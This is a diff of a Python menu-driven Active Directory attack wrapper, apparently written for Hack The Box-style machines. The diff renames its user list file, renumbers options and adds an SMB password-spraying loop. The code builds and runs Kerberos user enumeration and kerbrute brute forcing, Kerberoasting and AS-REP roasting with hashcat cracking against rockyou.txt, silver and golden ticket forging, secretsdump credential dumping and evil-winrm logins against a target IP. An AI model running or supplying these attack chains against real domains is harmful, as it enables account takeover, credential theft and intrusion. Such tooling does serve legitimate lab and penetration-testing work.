 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Details : #HKEY_LOCAL_MACHINE\SAM
 # Modified: N/A
@@ -1259,7 +1254,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
 # Modified: 
 # -------------------------------------------------------------------------------------
@@ -1282,7 +1277,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R ?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1305,7 +1300,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1328,7 +1323,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1351,7 +1346,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1374,19 +1369,19 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
-# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=users.txt IP.
+# Version : Forest
+# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
       if TIP[:5] != "EMPTY":
          print("\n[*] Please wait, checking to see if any found username is assigned to Kerberous...")
-         command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=users.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
+         command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
          command("sed -i '/@/!d' KUSERS.tmp")
          command("sort KUSERS.tmp > USERS2.tmp")
          os.remove("KUSERS.tmp")	# DELETE FILE
-         os.remove("users.txt")		# DELETE OLD FILE
+         os.remove("usernames.txt")		# DELETE OLD FILE
 	
          for x in range (0, MAXX):
             TEMP = linecache.getline("USERS2.tmp", x+1)
@@ -1398,7 +1393,7 @@ while True:
                if TEMP[:1] != " ":							# CONTAINS DATA
                   USER[x] = TEMP							# ASSIGN USER NAME
                   print("[+] Found user ", USER[x])
-                  command("echo " + USER[x] + " >> users.txt")				# EXPORT FOUND USER
+                  command("echo " + USER[x] + " >> usernames.txt")				# EXPORT FOUND USER
             else:
                USER[x] = " "*COL3							# ASSIGN EMPTY USER
             if USER[x][:1] != " ": PASS[x] = "."*COL4					# RESET HASH VALUE
@@ -1412,8 +1407,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
-# Details : Menu option selected - kerbrute.py -domain DOMAIN -users users.txt -passwords passwords.txt -outputfile optional.txt.
+# Version : Forest
+# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1431,7 +1426,7 @@ while True:
       if CheckParams != 1:
          found = 0
          print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile password1.txt")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.txt")
 
          test1 = linecache.getline("password1.txt", 1)
          test1 = test1.rstrip("\n")
@@ -1443,7 +1438,7 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all usernames with matching passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile password2.txt")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile password2.txt")
          
          test2 = linecache.getline("password2.txt", 1)
          test2 = test2.rstrip("\n")
@@ -1467,7 +1462,7 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all users with random passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile password4.txt")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile password4.txt")
      
          test4 = linecache.getline("password4.txt", 1)
          test4 = test4.rstrip("\n")
@@ -1482,7 +1477,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1499,20 +1494,20 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         if linecache.getline('users.txt', 1) != " ":
+         if linecache.getline('usernames.txt', 1) != " ":
             command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
             print("\n[*] Cracking hash values if they exists...\n")
             command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
             command("strings cracked1.txt")
          else:
-            print("[-] The file users.txt is empty...")
+            print("[-] The file usernames.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
-# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashroast2.txt
+# Version : Forest
+# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1528,19 +1523,19 @@ while True:
          CheckParams = 1
 
       if CheckParams != 1:
-         if linecache.getline('users.txt', 1) != " ":
-            command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile users.txt")
+         if linecache.getline('usernames.txt', 1) != " ":
+            command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
             print("\n[*] Cracking hash values if they exists...\n")
             command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
             command("strings cracked2.txt")
          else:
-            print("[-] The file users.txt is empty...")
+            print("[-] The file usernames.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1562,7 +1557,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
@@ -1615,7 +1610,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1627,7 +1622,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Forest
 # Details : Silver Ticket!! 
 # Modified: N/A
@@ -1680,7 +1675,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Details : Golden Ticket!!
 # Modified: N/A
@@ -1732,7 +1727,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1767,7 +1762,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1792,35 +1787,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
-# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='52':
-      CheckParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         CheckParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         CheckParams = 1
-
-      if CheckParams != 1:
-         command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
-      prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='53':
+   if selection =='52':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -1875,12 +1847,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='54':
+   if selection =='53':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -1917,12 +1889,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='55':
+   if selection =='54':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -1952,12 +1924,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - domain/username:password@<targetName or address
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='56':
+   if selection =='55':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -1987,12 +1959,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='57':
+   if selection =='56':
       CheckParams = 0
 
       if DOM[:5] == "EMPTY":
@@ -2022,50 +1994,129 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - crewl -d 3 -m5 -w textfile.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='58':
+   if selection =='57':
       if TIP[:5] != "EMPTY":
-         command("cewl -d 3 -m 5 -w users.txt " + TIP.rstrip(" ") + " 2>&1")
+         command("cewl -d 3 -m 5 -w usernames.txt " + TIP.rstrip(" ") + " 2>&1")
          print("\n[+] Userlist generated via website...")
 
          if os.path.exists("/usr/share/ncrack/minimal.usr"):
-            command("cat /usr/share/ncrack/minimal.usr >> users.txt 2>&1")
-            command("sed -i '/#/d' users.txt 2>&1")
+            command("cat /usr/share/ncrack/minimal.usr >> usernames.txt 2>&1")
+            command("sed -i '/#/d' usernames.txt 2>&1")
             print("[+] NCrack minimal.usr list added as well...")
 
          for x in range (0,MAXX):
-            USER[x] = linecache.getline("users.txt", x+1).rstrip(" ")
+            USER[x] = linecache.getline("usernames.txt", x+1).rstrip(" ")
             if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
       prompt()
 
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
-# Details : Menu option selected - Nano users.txt
+# Version : Forest
+# Details : Menu option selected - Nano usernames.txt
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='58':
+      command("nano usernames.txt")
+      for x in range (0, MAXX):
+         USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
+         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+      prompt()
+      
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Forest
+# Details : Menu option selected - Nano passwords.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='59':
-      command("nano users.txt")
-      for x in range (0, MAXX):
-         USER[x] = linecache.getline("users.txt", x + 1).rstrip(" ")
-         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+      command("nano passwords.txt")
+      prompt()
+      
+#------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Forest
+# Details : Menu option selected - SMB Spray with USERS AND PASSWORDS
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='60':
+      CheckParams = 0   
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+      
+      if os.path.getsize("usernames.txt") == 0:
+         print("\n[-] Username file is empty...")
+         print("[*] Adding universal user 'administrator'")
+         command("echo administrator >> usernames.txt")
+         
+      if os.path.getsize("passwords.txt") == 0:
+         print("\n[-] Password file is empty...")
+         print("[*] Adding universal password 'password'")
+         command("echo password >> passwords.txt")
+   
+      OutLoop = int(len(open('usernames.txt').readlines()))
+      InLoop  = int(len(open('passwords.txt').readlines()))
+      Reset   = InLoop
+      
+      while OutLoop != 0:
+         line1 = linecache.getline("usernames.txt", OutLoop).rstrip("\n")
+         while InLoop != 0:
+            line2 = linecache.getline("passwords.txt", InLoop).rstrip("\n")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + line1.rstrip(" ") + " -p " + line2.rstrip(" "))
+            InLoop -= 1
+         OutLoop -= 1
+         InLoop = Reset
+      prompt()      
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : Forest
+# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='61':
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         BH1 = input("\n[+] Enter Neo4j username: ")
+         BH2 = input("[+] Enter Neo4j password: ")
+         if BH1 != "" and BH2 != "":
+            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s " + TIP.rstrip(" "))
+         else:
+            print("\n[-] Username or password cannot be null...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - pftb IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='60':
+   if selection =='62':
       if TIP[:5] != "EMPTY":
          command("pftp " + TIP.rstrip(" "))
       prompt()
@@ -2073,12 +2124,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - ssh -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='61':
+   if selection =='63':
       if TIP[:5] != "EMPTY":
          command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
       prompt()
@@ -2086,12 +2137,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - telnet -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='62':
+   if selection =='64':
       if TIP[:5] != "EMPTY":
          command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
       prompt()
@@ -2099,12 +2150,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - nc IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='63':
+   if selection =='65':
       if TIP[:5] != "EMPTY":
          command("nc " + TIP.rstrip(" "))
       prompt()
@@ -2112,12 +2163,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Windows remote login on port 5985.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='64':
+   if selection =='66':
       if TIP[:5] != "EMPTY":
          command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
       prompt()
@@ -2125,41 +2176,31 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - rdesktop - u user -p password -d domain / IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='65':
+   if selection =='67':
       if TIP[:5] != "EMPTY":
          command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
       prompt()
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
-# Details : Menu option selected - 
+# Version : Forest
+# Details : Menu option selected - BLANK
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='67':
-      exit(1) 
-
+   if selection == '68':
+      prompt()
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Monteverde
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='68':
-      exit(1)
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : Monteverde
+# Version : Forest
 # Details : Menu option selected - Save current data to config.txt and exit the program.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2186,7 +2227,9 @@ while True:
       temp = '\"' + CMD.rstrip(" ") + '\"'
       command("echo " + temp + " >> config.txt")  
       command("echo " + LTM  + " >> config.txt")  
-      command("echo " + DIR  + " >> config.txt")       
+      command("echo " + DIR  + " >> config.txt")   
+      os.remove("usernames.txt")
+      os.remove("passwords.txt")    
       exit(1)
 
 # Eof...	
